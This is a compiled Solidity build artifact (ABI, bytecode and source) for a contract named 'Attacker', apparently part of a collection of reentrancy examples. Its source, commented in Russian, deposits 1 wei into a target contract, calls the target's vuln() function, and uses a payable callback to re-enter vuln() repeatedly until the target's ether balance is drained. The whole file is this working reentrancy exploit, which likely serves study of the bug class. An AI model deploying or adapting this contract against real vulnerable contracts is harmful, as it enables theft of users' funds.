{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor",
      "payable": true
    },
    {
      "inputs": [],
      "name": "exploit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "recvETH",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x60806040526040516104743803806104748339818101604052810190610025919061010f565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b6103298061014b6000396000f3fe6080604052600436106100295760003560e01c806363d9b7701461002e578063b9d5647014610045575b600080fd5b34801561003a57600080fd5b5061004361004f565b005b61004d6101b9565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100a957600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db060016040518263ffffffff1660e01b81526004016000604051808303818588803b15801561011257600080fd5b505af1158015610126573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e3bb15f060016040518263ffffffff1660e01b815260040161018591906102d8565b600060405180830381600087803b15801561019f57600080fd5b505af11580156101b3573d6000803e3d6000fd5b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156102875760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e3bb15f060016040518263ffffffff1660e01b815260040161025491906102d8565b600060405180830381600087803b15801561026e57600080fd5b505af1158015610282573d6000803e3d6000fd5b505050505b565b6000819050919050565b6000819050919050565b6000819050919050565b60006102c26102bd6102b884610289565b61029d565b610293565b9050919050565b6102d2816102a7565b82525050565b60006020820190506102ed60008301846102c9565b9291505056fea264697066735822122096b1b3b8e09fa71f606285520b14f6ca1312993e4a366a30b978c315a55104e764736f6c63430008110033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.8.7;\n\ninterface ITarget {\n\tfunction vuln(uint256 amount) external;\n\tfunction deposit() external payable;\n}\n\ncontract Attacker {\n\tITarget private target;\n\taddress private owner;\n\tconstructor(address _target) public payable { // вносим в контракт атакующего минимальный баланс в размере 1 wei.\n\t\ttarget = ITarget(_target);\n\t\towner = msg.sender;\n\t}\n\tfunction exploit() external {\n\t\trequire(msg.sender == owner);\n\t\ttarget.deposit{value:1 wei}(); // вносим минимальный баланс\n\t\ttarget.vuln(1); // начинаем атаку реетранси\n\t}\n\tfunction recvETH() external payable {\n\t\tif (address(target).balance > 0) { // если баланс не нулевой, декрементируем и повторно входим в vuln функцию\n\t\t\ttarget.vuln(1);\n\t\t}\n\t}\n}\n",
  "sourcePath": "/home/neo/blockfuck/git/all_reentrancy_in_one_repo/interface_call_reentrancy/contracts/attacker_contract.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-11-07T12:41:19.915Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}